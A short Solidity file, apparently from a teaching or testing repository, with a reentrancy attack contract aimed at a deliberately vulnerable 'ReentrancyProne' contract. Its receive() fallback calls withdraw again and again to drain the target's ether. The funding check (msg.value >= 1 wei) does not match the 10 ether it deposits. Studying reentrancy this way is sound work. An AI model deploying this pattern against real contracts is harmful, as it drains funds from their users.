// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import {ReenterProne} from "../src/ReentrancyProne.sol";

contract ReentrancyAttack {
    ReenterProne public reenter;

    constructor(address _reenterProne) {
        reenter = ReenterProne(_reenterProne);
    }

    receive() external payable {
        if (address(reenter).balance >= 1 ether) {
            reenter.withdraw();
        }
    }

    function Attack() public payable {
        require(msg.value >= 1, "Insufficient funds");
        reenter.deposit{value: 10 ether}();
        reenter.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
